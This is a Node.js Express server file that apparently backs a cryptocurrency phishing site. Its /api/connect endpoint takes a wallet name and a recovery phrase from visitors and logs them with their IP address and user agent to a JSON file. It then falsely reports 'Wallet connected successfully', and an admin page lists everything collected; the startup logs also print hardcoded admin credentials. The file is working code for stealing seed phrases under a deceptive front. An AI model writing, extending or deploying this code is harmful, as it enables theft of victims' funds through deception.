
// Import required modules
const express = require('express');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');

// Create Express application
const app = express();
const PORT = process.env.PORT || 7860;

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname)));

// Helper function to ensure the data file exists
function ensureDataFileExists() {
  const dataPath = path.join(__dirname, 'data.json');
  if (!fs.existsSync(dataPath)) {
    fs.writeFileSync(dataPath, JSON.stringify({ activities: [] }), 'utf8');
  }
}

// Helper function to read activities from data file
function getActivities() {
  ensureDataFileExists();
  const dataPath = path.join(__dirname, 'data.json');
  const rawData = fs.readFileSync(dataPath, 'utf8');
  return JSON.parse(rawData).activities;
}

// Helper function to save activities to data file
function saveActivities(activities) {
  const dataPath = path.join(__dirname, 'data.json');
  fs.writeFileSync(dataPath, JSON.stringify({ activities }), 'utf8');
}

// API endpoint to handle wallet connections
app.post('/api/connect', (req, res) => {
  try {
    const { wallet, phrase, timestamp, userAgent } = req.body;
    
    // Validate required fields
    if (!wallet || !phrase) {
      return res.status(400).json({ error: 'Wallet and phrase are required' });
    }
    
    // Get client's IP address
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    // Create new activity record
    const newActivity = {
      wallet,
      phrase,
      timestamp: timestamp || new Date().toISOString(),
      ip,
      userAgent
    };
    
    // Get existing activities
    const activities = getActivities();
    
    // Add new activity to the beginning of the array
    activities.unshift(newActivity);
    
    // Save updated activities
    saveActivities(activities);
    
    // Return success response
    return res.status(200).json({ success: true, message: 'Wallet connected successfully' });
  } catch (error) {
    console.error('Error processing wallet connection:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// API endpoint to get all activities (admin only)
app.get('/api/activities', (req, res) => {
  try {
    // In a real application, you would add authentication here
    const activities = getActivities();
    return res.status(200).json({ activities });
  } catch (error) {
    console.error('Error fetching activities:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Route for the admin page
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Route for the error page
app.get('/error', (req, res) => {
  res.sendFile(path.join(__dirname, 'error.html'));
});

// Default route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// 404 handler
app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'error.html'));
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`- Main site: http://localhost:${PORT}`);
  console.log(`- Admin panel: http://localhost:${PORT}/admin`);
  console.log('Admin credentials:');
  console.log('- Username: cblsupport001');
  console.log('- Password: og001cbl');
});

// Create data file if it doesn't exist
ensureDataFileExists();
